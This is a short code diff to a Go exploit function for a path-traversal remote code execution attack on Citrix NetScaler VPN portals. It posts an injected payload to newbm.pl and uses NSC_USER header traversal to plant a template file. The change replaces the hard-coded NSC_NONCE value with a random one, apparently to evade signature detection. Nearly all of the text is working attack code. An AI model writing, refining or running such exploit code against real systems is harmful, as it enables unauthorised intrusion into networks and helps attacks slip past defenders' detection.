@@ -50,6 +50,7 @@ func exploit(target string, cmd string) {
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
 	filename := randomString(7)
+	nonce := randomString(2)
 	client := &http.Client{Transport: tr}
 	postData := []byte("url=http://example.com/&title=" + payload + "&desc=desc&UI_inuse=a")
 	req, err := http.NewRequest("POST", target+"/vpn/../vpns/portal/scripts/newbm.pl", bytes.NewReader(postData))
@@ -57,7 +58,7 @@ func exploit(target string, cmd string) {
 		panic(err)
 	}
 	req.Header.Add("NSC_USER", "../../../../netscaler/portal/templates/"+filename)
-	req.Header.Add("NSC_NONCE", "aa")
+	req.Header.Add("NSC_NONCE", nonce)
 	resp, err := client.Do(req)
 	if err != nil {
 		panic(err)
@@ -73,7 +74,7 @@ func exploit(target string, cmd string) {
 		panic(err)
 	}
 	req.Header.Add("NSC_USER", "../../../../netscaler/portal/templates/"+filename)
-	req.Header.Add("NSC_NONCE", "aa")
+	req.Header.Add("NSC_NONCE", nonce)
 	resp, err = client.Do(req)
 	if err != nil {
 		panic(err)
